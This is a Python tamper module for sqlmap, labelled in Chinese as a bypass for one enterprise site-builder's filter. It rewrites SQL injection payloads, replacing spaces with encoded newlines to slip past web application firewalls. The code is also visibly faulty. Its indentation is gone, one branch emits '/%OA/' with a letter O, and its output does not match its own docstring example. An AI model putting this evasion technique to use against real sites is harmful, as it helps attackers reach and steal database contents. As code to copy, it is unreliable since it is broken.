# coding=UTF-8 
# Desc: sqlmap_bypass_某企业建站程序过滤_tamper 

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
pass

def tamper(payload, **kwargs):
"""
把空格替换成换行符：%0A
Replaces space character (' ') with comments '%0A'

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

Notes:
* Useful to bypass weak and bespoke web application firewalls

>>> tamper('SELECT id FROM users')
'SELECT%0Aid%0AFROM%0Ausers'
"""

retVal = payload

if payload:
retVal = ""
quote, doublequote, firstspace = False, False, False

for i in xrange(len(payload)):
if not firstspace:
if payload[i].isspace():
firstspace = True
retVal += "/%OA/"
continue

elif payload[i] == '\'':
quote = not quote

elif payload[i] == '"':
doublequote = not doublequote

elif payload[i] == " " and not doublequote and not quote:
retVal += "/%0A/"
continue

retVal += payload[i]

return retVal